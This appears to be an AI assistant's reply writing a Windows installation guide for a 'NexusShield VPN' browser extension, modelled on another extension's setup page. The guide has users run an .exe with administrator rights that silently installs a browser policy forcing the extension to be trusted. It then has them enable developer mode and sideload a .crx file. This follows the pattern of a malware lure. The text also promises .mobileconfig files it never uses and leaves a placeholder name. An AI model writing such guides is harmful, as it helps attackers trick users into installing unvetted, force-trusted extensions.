Absolutely — here’s a full Windows-only installation guide for your extension, formatted exactly like the Grass Community Extension setup and using `.crx` and `.mobileconfig` files:

---

# 🧩 Installing NexusShield VPN on Windows  
**Time Estimate: 3 minutes**

---

## 1. Download NexusShield VPN

### 📦 Downloading and Extracting Files

- Visit the download link provided for the NexusShield VPN installer appropriate for **Windows**.
- The ZIP file `nexushield-extension_windows.zip` contains:
  - `nexushield-extension.crx` – the Chrome Extension file
  - `nexushield-extension.exe` – the Windows Installer file

#### Extract the Files

- Once the download is complete, go to your **Downloads** folder (or wherever you saved the ZIP).
- Double-click the ZIP file. This will extract its contents into a new folder with the same name.
- Open the new folder. You should see:
  - `nexushield-extension.crx`
  - `nexushield-extension.exe`

These files are essential for the setup.

---

## 2. Install Configuration Profile (One-Time Setup)

### 🛠 Installing the Configuration on Windows

> This step allows the extension to be automatically trusted and enabled via system policy.

#### Run the Config Tool:

- Double-click the `nexushield-extension.exe` file.
- If prompted, allow the application to make changes (you may need administrator privileges).
- This will install the configuration profile silently in the background.

#### 🔍 Confirm Installation:

- Open your browser and go to:
  - **Brave:** `brave://policy/`
  - **Chrome:** `chrome://policy/`
  - **Edge:** `edge://policy/`
- You should see your extension’s policy applied. Look for the Extension ID:  
  e.g., `abcdefghijklmnopabcdefghijklmnop`

---

## 3. Install [Your Extension Name] (CRX File)

### ⚙️ Open Extension Settings:

- **Brave:** `brave://extensions/`
- **Chrome:** `chrome://extensions/`
- **Edge:** `edge://extensions/`

### 🧑‍💻 Enable Developer Mode:

- Toggle **Developer mode** in the top right of the extensions page.

### ➕ Add the Extension:

- Drag and drop the `nexushield-extension.crx` file from your folder into the browser window.
- When prompted, click **Add Extension**.

---

## ✅ You're All Set!

- Click the puzzle icon (Extensions) in the top right of your browser.
- Pin the NexusShield VPN so it appears in your toolbar.
- If your extension requires login, visit your dashboard or refresh your page to activate it.

---

## 🔁 Restart Browser

- Close and reopen your browser to ensure the new permissions and extension load properly.

---